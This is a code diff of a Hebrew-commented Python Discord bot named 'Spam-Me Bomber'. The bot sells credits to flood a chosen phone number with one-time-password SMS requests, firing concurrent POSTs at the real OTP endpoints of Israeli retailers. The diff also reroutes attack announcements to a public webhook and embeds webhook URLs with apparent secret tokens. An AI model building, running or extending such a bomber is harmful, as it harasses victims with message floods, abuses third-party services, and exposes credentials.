@@ -10,12 +10,11 @@ import http.server
 import socketserver
 import threading
 
-# --- הגדרות מערכת ---
-LOG_WEBHOOK_URL = "https://discord.com/api/webhooks/1500272424271216722/0-37rlL5Dhf534ZR29rGVbi_jADkvNbaKVg7TJBWvEuGf99pBpxGqrVPB_7DH8JWLtQI"
-DB_FILE = "credits_db.json"
-ADMIN_ROLE_NAME = "Owner"
+# --- ה-Webhook הציבורי שכולם יראו ---
+PUBLIC_WEBHOOK_URL = "https://discord.com/api/webhooks/1499107473347313846/VN0GUsgF-yvXR5KoUszjJuIZbBqqYFs6hIVhGe-ZF7ppMqGDLW4WY-zZbYPk23ls2nl4"
 
-# --- ניהול מסד נתונים ---
+# --- ניהול נתונים ---
+DB_FILE = "credits_db.json"
 def load_data():
     if os.path.exists(DB_FILE):
         with open(DB_FILE, "r") as f:
@@ -31,7 +30,7 @@ def save_data(credits, lifetime):
 
 user_credits, lifetime_users = load_data()
 
-# --- שרת Render לשמירה על הבוט דלוק ---
+# --- שרת Render ---
 def run_on_render():
     PORT = int(os.environ.get("PORT", 8080))
     with socketserver.TCPServer(("", PORT), http.server.SimpleHTTPRequestHandler) as httpd:
@@ -45,16 +44,13 @@ class MyBot(commands.Bot):
         await self.tree.sync()
 
 bot = MyBot()
+ADMIN_ROLE_NAME = "Owner"
 sem = asyncio.Semaphore(15)
 
-# --- פונקציות עזר (לוגים וספאם) ---
-async def send_log(user, phone, amount):
+# פונקציה לשליחת הודעה ל-Webhook שכולם רואים
+async def send_to_webhook(embed):
     async with aiohttp.ClientSession() as session:
-        webhook = Webhook.from_url(LOG_WEBHOOK_URL, session=session)
-        embed = discord.Embed(title="🔔 הפעלה חדשה", color=0x3498db)
-        embed.add_field(name="👤 משתמש", value=f"{user.name} ({user.id})", inline=False)
-        embed.add_field(name="📱 יעד", value=phone, inline=True)
-        embed.add_field(name="💰 קרדיטים", value=str(amount), inline=True)
+        webhook = Webhook.from_url(PUBLIC_WEBHOOK_URL, session=session)
         await webhook.send(embed=embed)
 
 async def call_api(client, url, method, payload):
@@ -68,7 +64,6 @@ async def call_api(client, url, method, payload):
         except: return False
 
 async def send_spam(user, phone, seconds):
-    # רשימת אתרים לדוגמה - מומלץ להוסיף עוד כדי לחזק את הספאם
     apis = [
         {"url": "https://www.shufersal.co.il/online/he/login/send-otp", "method": "POST", "data": {"phone": phone}},
         {"url": "https://www.super-pharm.co.il/api/otp/send", "method": "POST", "data": {"phoneNumber": phone}},
@@ -89,16 +84,14 @@ async def send_spam(user, phone, seconds):
             fail_count += results.count(False)
             await asyncio.sleep(3)
 
-    # שליחת סיכום לפרטי (DM)
-    try:
-        embed = discord.Embed(title="📊 סיכום הפצצה - Spam-Me", color=0x2ecc71)
-        embed.add_field(name="📱 יעד", value=phone, inline=False)
-        embed.add_field(name="✅ הצלחות", value=str(success_count), inline=True)
-        embed.add_field(name="❌ כשלונות", value=str(fail_count), inline=True)
-        await user.send(embed=embed)
-    except: pass
+    # סיכום שכולם יראו בערוץ דרך ה-Webhook
+    embed = discord.Embed(title="📊 סיום הפצצה - Spam-Me", color=0x2ecc71)
+    embed.add_field(name="👤 הופעל ע\"י", value=user.name, inline=True)
+    embed.add_field(name="📱 יעד", value=f"||{phone}||", inline=True) # המספר מוסתר בקו כזה
+    embed.add_field(name="✅ הצלחות", value=str(success_count), inline=True)
+    embed.add_field(name="❌ כשלונות", value=str(fail_count), inline=True)
+    await send_to_webhook(embed)
 
-# --- ממשק משתמש (UI) ---
 class SpamModal(discord.ui.Modal, title='Spam-Me Control Panel'):
     phone = discord.ui.TextInput(label='Phone Number', placeholder='05XXXXXXXX', min_length=10, max_length=10)
     credits = discord.ui.TextInput(label='Credits (1 = 35s)', placeholder='1')
@@ -109,17 +102,25 @@ class SpamModal(discord.ui.Modal, title='Spam-Me Control Panel'):
             is_owner = any(r.name == ADMIN_ROLE_NAME for r in interaction.user.roles)
             
             if not (interaction.user.id in lifetime_users or is_owner) and user_credits.get(interaction.user.id, 0) < amt:
-                return await interaction.response.send_message("❌ אין לך מספיק קרדיטים!", ephemeral=True)
+                return await interaction.response.send_message("❌ אין קרדיטים!", ephemeral=True)
 
             if not (interaction.user.id in lifetime_users or is_owner):
                 user_credits[interaction.user.id] -= amt
                 save_data(user_credits, lifetime_users)
 
-            asyncio.create_task(send_log(interaction.user, self.phone.value, amt))
-            await interaction.response.send_message(f"🚀 הפצצה על {self.phone.value} החלה! סיכום יישלח אליך לפרטי.", ephemeral=True)
+            # הודעת "התחלנו" ל-Webhook שכולם רואים
+            start_embed = discord.Embed(title="🚀 הפצצה חדשה יצאה לדרך!", color=0xe74c3c)
+            start_embed.add_field(name="👤 משתמש", value=interaction.user.name, inline=True)
+            start_embed.add_field(name="📱 יעד", value=f"||{self.phone.value}||", inline=True)
+            start_embed.add_field(name="⏳ זמן", value=f"{amt * 35} שניות", inline=True)
+            asyncio.create_task(send_to_webhook(start_embed))
+            
+            # הודעה פרטית למפעיל כדי שידע שזה עבד
+            await interaction.response.send_message("✅ ההפצצה נשלחה ל-Webhook הציבורי!", ephemeral=True)
+            
             asyncio.create_task(send_spam(interaction.user, self.phone.value, amt * 35))
         except:
-            await interaction.response.send_message("❌ שגיאה בנתונים שהוזנו.", ephemeral=True)
+            await interaction.response.send_message("❌ שגיאה בנתונים", ephemeral=True)
 
 class ControlView(discord.ui.View):
     def __init__(self): super().__init__(timeout=None)
@@ -128,14 +129,13 @@ class ControlView(discord.ui.View):
     @discord.ui.button(label="💰 My Credits", style=discord.ButtonStyle.secondary)
     async def cr(self, i, b):
         bal = "Unlimited ♾️" if i.user.id in lifetime_users else user_credits.get(i.user.id, 0)
-        await i.response.send_message(f"💰 יתרה נוכחית: {bal}", ephemeral=True)
+        await i.response.send_message(f"💰 יתרה: {bal}", ephemeral=True)
 
-# --- פקודות Slash ---
-@bot.tree.command(name="setup", description="הצגת לוח הבקרה (Owner בלבד)")
+@bot.tree.command(name="setup")
 async def setup(i: discord.Interaction):
     if not any(r.name == ADMIN_ROLE_NAME for r in i.user.roles):
-        return await i.response.send_message("❌ פקודה זו ל-Owner בלבד!", ephemeral=True)
-    emb = discord.Embed(title="Spam-Me Bomber", description="השתמש בכפתורים לניהול הספאם.\n1 קרדיט = 35 שניות.", color=0x2f3136)
+        return await i.response.send_message("❌ ל-Owner בלבד!", ephemeral=True)
+    emb = discord.Embed(title="Spam-Me Bomber", description="1 Credit = 35 Seconds", color=0x2f3136)
     await i.response.send_message(embed=emb, view=ControlView())
 
 @bot.tree.command(name="add_credits")
@@ -144,12 +144,5 @@ async def add(i: discord.Interaction, m: discord.Member, a: int):
     user_credits[m.id] = user_credits.get(m.id, 0) + a
     save_data(user_credits, lifetime_users)
     await i.response.send_message(f"✅ נוספו {a} קרדיטים ל-{m.mention}", ephemeral=True)
-
-@bot.tree.command(name="remove_credits")
-async def remove(i: discord.Interaction, m: discord.Member, a: int):
-    if not any(r.name == ADMIN_ROLE_NAME for r in i.user.roles): return
-    user_credits[m.id] = max(0, user_credits.get(m.id, 0) - a)
-    save_data(user_credits, lifetime_users)
-    await i.response.send_message(f"📉 הוסרו {a} קרדיטים מ-{m.mention}", ephemeral=True)
 
 bot.run(os.environ.get("DISCORD_TOKEN"))
